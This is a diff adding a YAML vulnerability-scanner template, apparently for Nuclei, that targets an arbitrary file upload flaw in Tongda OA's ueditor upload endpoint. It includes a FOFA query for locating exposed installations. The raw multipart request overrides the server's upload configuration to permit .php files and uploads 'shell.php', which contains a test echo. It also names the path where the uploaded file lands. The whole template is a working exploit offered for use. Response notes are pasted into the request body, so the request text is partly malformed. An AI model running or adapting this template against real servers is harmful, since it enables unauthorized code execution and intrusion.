@@ -1,0 +1,114 @@
+id: poc-xr2d75zl6wg8subq
+info:
+  name: 通达OA action 前台任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xr2d75zl6wg8subq'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xr2d75zl6wg8subq
+    fofa: fofa：title="office Anywhere" && icon_hash="-759108386" && "2016"
+http:
+- raw:
+  - 'POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1
+
+
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+
+    Connection: keep-alive
+
+
+
+
+    --00content0boundary00
+
+
+    Content-Disposition: form-data; name="CONFIG[fileFieldName]"
+
+
+
+
+    filename
+
+
+    --00content0boundary00
+
+
+    Content-Disposition: form-data; name="CONFIG[fileMaxSize]"
+
+
+
+
+    10000
+
+
+    --00content0boundary00
+
+
+    Content-Disposition: form-data; name="CONFIG[filePathFormat]"
+
+
+
+
+    shell
+
+
+    --00content0boundary00
+
+
+    Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"
+
+
+
+
+    .php
+
+
+    --00content0boundary00
+
+
+    Content-Disposition: form-data; name="mufile"
+
+
+
+
+    submit
+
+
+    --00content0boundary00
+
+
+    Content-Disposition: form-data; name="filename"; filename="shell.php"
+
+
+
+
+    <?php echo 123;?>
+
+
+    --00content0boundary00--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /shell.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
